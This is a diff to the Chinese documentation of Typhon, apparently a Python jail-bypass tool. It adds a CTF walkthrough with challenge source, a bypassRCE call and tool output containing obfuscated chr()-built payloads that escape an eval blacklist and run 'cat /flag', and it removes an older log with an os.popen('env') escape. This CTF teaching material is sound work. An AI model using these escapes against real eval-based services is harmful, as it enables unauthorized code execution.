@@ -3,7 +3,7 @@ EXAMPLE 示例
 
 此页用于提供关于 ``Typhon`` 的一些实战例题。
 
-PwnyCTF-Pyjail 2
+PwnyCTF 2025-Pyjail 2
 -------------------
 
 题目链接： https://ctf.sigpwny.com/challenges#Vault/Pyjail%202-633
@@ -120,6 +120,133 @@ flag位于 ``/flag.txt`` 文件中。
 
 此时，我们再远程环境中输入 ``help()`` 再利用 `相应的技术 <https://typhonbreaker.readthedocs.io/zh-cn/latest/FAQ.html#help-rce>`_ 进行绕过即可 。
 
+HNCTF 2022-calc_jail_beginner_level1
+----------------------------------------------------------------
+
+.. code-block:: python
+    :linenos:
+    :emphasize-lines: 6,29
+
+    #the function of filter will banned some string ',",i,b
+    #it seems banned some payload 
+    #Can u escape it?Good luck!
+
+    def filter(s):
+        not_allowed = set('"\'`ib')
+        return any(c in not_allowed for c in s)
+
+    WELCOME = '''
+    _                _                           _       _ _   _                _ __ 
+    | |              (_)                         (_)     (_) | | |              | /_ |
+    | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
+    | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
+    | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
+    |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
+                __/ |                          _/ |                                  
+                |___/                          |__/                                                                                      
+    '''
+
+    print(WELCOME)
+
+    print("Welcome to the python jail")
+    print("Let's have an beginner jail of calc")
+    print("Enter your expression and I will evaluate it for you.")
+    input_data = input("> ")
+    if filter(input_data):
+        print("Oh hacker!")
+        exit(0)
+    print('Answer: {}'.format(eval(input_data)))
+
+同上题，我们将 ``eval`` 所包含的行改为对应的绕过函数。将黑名单 ``"'`ib`` 作为 :attr:`~bypassRCE.banned_chr` 参数传入即可。（我们假设flag在 ``/flag`` ）
+
+此题中，为了追求更好的演示效果，我们假设这个程序不支持后续的输入（否则 ``help`` 直接可以解出，可以查看 `此题 <https://typhonbreaker.readthedocs.io/zh-cn/latest/EXAMPLE.html#pwnyctf-pyjail-2>`_ 的说明）。此处我们将 :attr:`~bypassRCE.interactive` 设置为 ``False``
+
+.. code-block:: python
+    :linenos:
+    :emphasize-lines: 29,30
+
+    #the function of filter will banned some string ',",i,b
+    #it seems banned some payload 
+    #Can u escape it?Good luck!
+
+    def filter(s):
+        not_allowed = set('"\'`ib')
+        return any(c in not_allowed for c in s)
+
+    WELCOME = '''
+    _                _                           _       _ _   _                _ __ 
+    | |              (_)                         (_)     (_) | | |              | /_ |
+    | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
+    | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
+    | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
+    |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
+                __/ |                          _/ |                                  
+                |___/                          |__/                                                                                      
+    '''
+
+    print(WELCOME)
+
+    print("Welcome to the python jail")
+    print("Let's have an beginner jail of calc")
+    print("Enter your expression and I will evaluate it for you.")
+    input_data = input("> ")
+    if filter(input_data):
+        print("Oh hacker!")
+        exit(0)
+    import Typhon
+    Typhon.bypassRCE('cat /flag', banned_chr = '"\'`ib', interactive = False)
+
+运行，是程序进行到 :func:`bypassRCE` 函数即可：
+
+.. code-block::
+    :emphasize-lines: 41
+
+    -----------Progress-----------
+
+
+    directly input bypass(0 payload found): None
+    generator(0 payload found): None
+    type(1 payload found): type
+    object(2 payloads found): str().__class__.__mro__[1]
+    bytes(3 payloads found): type(str().encode())
+    builtins set(10 payloads found): vars()[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)]
+    builtins module(24 payloads found): all.__self__
+    builtins(1 payload found): __builtins__
+    import(6 payloads found): getattr(all.__self__,chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))
+    load_module(7 payloads found): all.__self__.__loader__.load_module
+    modules(1 payload found): all.__self__.__loader__.load_module(chr(115)+chr(121)+chr(115)).modules
+    os(16 payloads found): all.__self__.__loader__.load_module(chr(111)+chr(115))
+    subprocess(16 payloads found): all.__self__.__loader__.load_module(chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115))
+    uuid(16 payloads found): all.__self__.__loader__.load_module(chr(117)+chr(117)+chr(105)+chr(100))
+    pydoc(16 payloads found): all.__self__.__loader__.load_module(chr(112)+chr(121)+chr(100)+chr(111)+chr(99))
+    multiprocessing(16 payloads found): all.__self__.__loader__.load_module(chr(109)+chr(117)+chr(108)+chr(116)+chr(105)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)+chr(105)+chr(110)+chr(103))
+    codecs(16 payloads found): all.__self__.__loader__.load_module(chr(99)+chr(111)+chr(100)+chr(101)+chr(99)+chr(115))
+    warnings(16 payloads found): all.__self__.__loader__.load_module(chr(119)+chr(97)+chr(114)+chr(110)+chr(105)+chr(110)+chr(103)+chr(115))
+    base64(16 payloads found): all.__self__.__loader__.load_module(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52))
+    importlib(16 payloads found): all.__self__.__loader__.load_module(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(108)+chr(105)+chr(98))
+    weakref(16 payloads found): all.__self__.__loader__.load_module(chr(119)+chr(101)+chr(97)+chr(107)+chr(114)+chr(101)+chr(102))
+    reprlib(16 payloads found): all.__self__.__loader__.load_module(chr(114)+chr(101)+chr(112)+chr(114)+chr(108)+chr(105)+chr(98))
+    sys(17 payloads found): all.__self__.__loader__.load_module(chr(115)+chr(121)+chr(115))
+    linecache(16 payloads found): all.__self__.__loader__.load_module(chr(108)+chr(105)+chr(110)+chr(101)+chr(99)+chr(97)+chr(99)+chr(104)+chr(101))
+    io(16 payloads found): all.__self__.__loader__.load_module(chr(105)+chr(111))
+    ctypes(16 payloads found): all.__self__.__loader__.load_module(chr(99)+chr(116)+chr(121)+chr(112)+chr(101)+chr(115))
+    profile(16 payloads found): all.__self__.__loader__.load_module(chr(112)+chr(114)+chr(111)+chr(102)+chr(105)+chr(108)+chr(101))
+    timeit(16 payloads found): all.__self__.__loader__.load_module(chr(116)+chr(105)+chr(109)+chr(101)+chr(105)+chr(116))
+    __import__2RCE(95 payloads found): all.__self__.__loader__.load_module(chr(111)+chr(115)).system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))
+
+
+    -----------Progress-----------
+
+
+    +++++++++++Jail broken+++++++++++
+
+
+    all.__self__.__loader__.load_module(chr(111)+chr(115)).system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))
+
+
+    +++++++++++Jail broken+++++++++++
+
+
 Typhon-Sample Pyjail 1 
 ----------------------
 
@@ -180,7 +307,7 @@ Typhon-Sample Pyjail 1
 
 - 命名空间为 ``{'__builtins__':None, 'st':str}`` 函数。
 
-我们可以利用 ``Typhon`` 库中的 ``bypassRCE()`` 函数绕过限制。由于flag在环境中，我们执行 ``env`` 即可得到flag。
+我们可以利用 ``Typhon`` 库中的 :func:`bypassRCE` 函数绕过限制。由于flag在环境中，我们执行 ``env`` 即可得到flag。
 
 .. code-block:: python
     :linenos:
@@ -195,7 +322,7 @@ Typhon-Sample Pyjail 1
 
 .. tip::
 
-    此处由于已经指定了命名空间，我们可以不在源代码上做修改，直接另起一个脚本调用 ``Typhon.bypassRCE()`` 函数。但当题目没有指定命名空间时（即没有 ``local_scope`` 参数时），我们需要在源代码中调用 ``Typhon.bypassRCE()`` 函数。
+    此处由于已经指定了命名空间，我们可以不在源代码上做修改，直接另起一个脚本调用 :func:`bypassRCE` 函数。但当题目没有指定命名空间时（即没有 ``local_scope`` 参数时），我们需要在源代码中调用 ``Typhon.bypassRCE()`` 函数。
     假如你不确定的话，也可以只在源代码中调用。
 
 执行上述代码，即可得到payload。
@@ -205,101 +332,7 @@ Typhon-Sample Pyjail 1
     对于复杂度较高的题目，可能需要等候较长时间。
 
 .. code-block::
-    :emphasize-lines: 125
-
-        .-')          _                 Typhon: a pyjail bypassing tool
-       (`_^ (    .----`/
-        ` )  \_/`   __/     __,    [Typhon Version]: v1.0.10
-        __{   |`  __/      /_/     [Python Version]: v3.9.0
-       / _{    \__/ '--.  //       [Github]: https://github.com/Team-intN18-SoybeanSeclab/Typhon
-       \_> \_\  >__/    \((        [Author]: LamentXU <lamentxu644@gmail.com>
-            _/ /` _\_   |))
-
-    INFO [-] no paths found to directly getshell.
-    INFO [*] Try to get string literals from docstrings.
-    Bypassing (421/421): [===============================================================================>] 100.0%
-    INFO [*] Try to get string literals from __name__.
-    Bypassing (3/3): [===============================================================================>] 100.0%
-    INFO [*] string literals found: {'s': 'st.__doc__.__getitem__(0)', 't': 'st.__doc__.__getitem__(1)', 'r': 'st.__doc__.__getitem__(0b10)', 'o': 'st.__doc__.__getitem__(0b100)', 'b': 'st.__doc__.__getitem__(0b101)', 'j': 'st.__doc__.__getitem__(0b110)', 'e': 'st.__doc__.__getitem__(0b111)', 'c': 'st.__doc__.__getitem__(0b1000)', 'y': 'st.__doc__.__getitem__(0b11011)', 'u': 'st.__doc__.__getitem__(0b100100)', 'f': 'st.__doc__.__getitem__(0b100101)', 'n': 'st.__doc__.__getitem__(0b101101)', 'd': 'st.__doc__.__getitem__(0b110000)', 'i': 'st.__doc__.__getitem__(0b110001)', 'g': 'st.__doc__.__getitem__(0b110011)', 'C': 'st.__doc__.__getitem__(0b1001001)', 'a': 'st.__doc__.__getitem__(0b1001100)', 'w': 'st.__doc__.__getitem__(0b1010100)', 'm': 'st.__doc__.__getitem__(0b1100111)', 'h': 'st.__doc__.__getitem__(0b1101010)', 'v': 'st.__doc__.__getitem__(111)', 'I': 'st.__doc__.__getitem__(0b1111011)', 'p': 'st.__doc__.__getitem__(0b10010101)', 'x': 'st.__doc__.__getitem__(0b10110101)', 'l': 'st.__doc__.__getitem__(0b11010000)', 'O': 'st.__doc__.__getitem__(0b100001010)'}
-    INFO [*] int literals found: {'0': '0', '1': '1'}
-    INFO [-] no paths found to directly getshell.
-    INFO [*] 3 paths found to obtain generator. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (3/3): [===============================================================================>] 100.0%
-    INFO [+] Success. 3 payload(s) in total.
-    INFO [*] Using (a for a in ()).gi_frame as payload of generator
-    INFO [*] 2 paths found to obtain type. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (2/2): [===============================================================================>] 100.0%
-    INFO [+] Success. 2 payload(s) in total.
-    INFO [*] Using st.__class__ as payload of type
-    INFO [*] 6 paths found to obtain object. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (6/6): [===============================================================================>] 100.0%
-    INFO [+] Success. 5 payload(s) in total.
-    INFO [*] Using ().__class__.__mro__.__getitem__(1) as payload of object
-    INFO [*] 3 paths found to obtain bytes. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (3/3): [===============================================================================>] 100.0%
-    INFO [+] Success. 2 payload(s) in total.
-    INFO [*] Using st.__class__(st().encode()) as payload of bytes
-    INFO [*] __builtins__ in this namespace is deleted, no way to restore it.
-    INFO [*] try to find __builtins__ in other namespaces.
-    INFO [*] 5 paths found to restore builtins in other namespaces. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (5/5): [===============================================================================>] 100.0%
-    INFO [-] no way to find a bypass method to restore builtins in other namespaces.
-    INFO [*] Trying to find inheritance chains.
-    Bypassing (206/206): [===============================================================================>] 100.0%
-    INFO [+] Found inheritance chain: ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0b101).__add__(st.__doc__.__getitem__(0b100100)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b11010000)).__add__(st.__doc__.__getitem__(1)).__add__(st.__doc__.__getitem__(0b110001)).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(0))) -> builtins
-    INFO [+] Found inheritance chain: ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))) -> sys
-    INFO [*] 2 paths found to obtain import. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (2/2): [===============================================================================>] 100.0%
-    INFO [-] no way to bypass blacklist to obtain import.
-    INFO [*] 2 paths found to obtain load_module. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (2/2): [===============================================================================>] 100.0%
-    INFO [-] no way to bypass blacklist to obtain load_module.
-    INFO [-] no paths found to obtain modules.
-    INFO [*] 4 paths found to obtain import. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (4/4): [===============================================================================>] 100.0%
-    INFO [-] no way to bypass blacklist to obtain import.
-    INFO [*] 4 paths found to obtain load_module. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (4/4): [===============================================================================>] 100.0%
-    INFO [-] no way to bypass blacklist to obtain load_module.
-    INFO [*] 1 paths found to obtain modules. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (1/1): [===============================================================================>] 100.0%
-    INFO [+] Success. 1 payload(s) in total.
-    INFO [*] Using ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules as payload of modules
-    INFO [*] try to import modules with MODULES path.
-    Bypassing (20/20): [===============================================================================>] 100.0%
-    INFO [*] modules we have found:
-    INFO {'builtins': <module 'builtins' (built-in)>, 'sys': <module 'sys' (built-in)>, 'os': <module 'os' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\os.py'>, 'codecs': <module 'codecs' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\codecs.py'>, 'warnings': <module 'warnings' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\warnings.py'>, 'importlib': <module 'importlib' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\importlib\\__init__.py'>, 'reprlib': <module 'reprlib' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\reprlib.py'>, 'linecache': <module 'linecache' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\linecache.py'>, 'io': <module 'io' from 'C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\io.py'>}
-    INFO [-] no paths found to obtain exec.
-    INFO [+] Using env as the command to execute.
-    INFO [*] 10 paths found to obtain __import__2RCE. Try to bypass blacklist with them. Please be paitent.
-    Bypassing (10/10): [===============================================================================>] 100.0%
-    INFO [+] Success. 1 payload(s) in total.
-    INFO [*] Using ().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(110).__init__.__globals__.__getitem__(st.__doc__.__getitem__(0).__add__(st.__doc__.__getitem__(0b11011)).__add__(st.__doc__.__getitem__(0))).modules.get(st.__doc__.__getitem__(0b100).__add__(st.__doc__.__getitem__(0))).popen(st.__doc__.__getitem__(0b111).__add__(st.__doc__.__getitem__(0b101101)).__add__(st.__doc__.__getitem__(111))).read() as payload of __import__2RCE
-
-
-    WARNING [!] index 0 of st.__doc__[0] must match the string literal s.
-    WARNING [!] index 4 of st.__doc__[4] must match the string literal o.
-    WARNING [!] index 7 of st.__doc__[7] must match the string literal e.
-    WARNING [!] index 27 of st.__doc__[27] must match the string literal y.
-    WARNING [!] index 45 of st.__doc__[45] must match the string literal n.
-    WARNING [!] index 111 of st.__doc__[111] must match the string literal v.
-    WARNING [!] 110 is the index of StreamReaderWriter, path to sys must fit in index of StreamReaderWriter.
-    WARNING [!] index 1 of st.__doc__[1] must match the string literal t.
-    WARNING [!] index 5 of st.__doc__[5] must match the string literal b.
-    WARNING [!] index 36 of st.__doc__[36] must match the string literal u.
-    WARNING [!] index 49 of st.__doc__[49] must match the string literal i.
-    WARNING [!] index 208 of st.__doc__[208] must match the string literal l.
-    WARNING [!] 110 is the index of StreamReaderWriter, path to builtins must fit in index of StreamReaderWriter.
-    WARNING [!] index 8 of st.__doc__[8] must match the string literal c.
-    WARNING [!] index 48 of st.__doc__[48] must match the string literal d.
-    WARNING [!] index 2 of st.__doc__[2] must match the string literal r.
-    WARNING [!] index 51 of st.__doc__[51] must match the string literal g.
-    WARNING [!] index 76 of st.__doc__[76] must match the string literal a.
-    WARNING [!] index 84 of st.__doc__[84] must match the string literal w.
-    WARNING [!] index 103 of st.__doc__[103] must match the string literal m.
-    WARNING [!] index 149 of st.__doc__[149] must match the string literal p.
-    WARNING [!] index 106 of st.__doc__[106] must match the string literal h.
-
+    :emphasize-lines: 35
 
     -----------Progress-----------
 
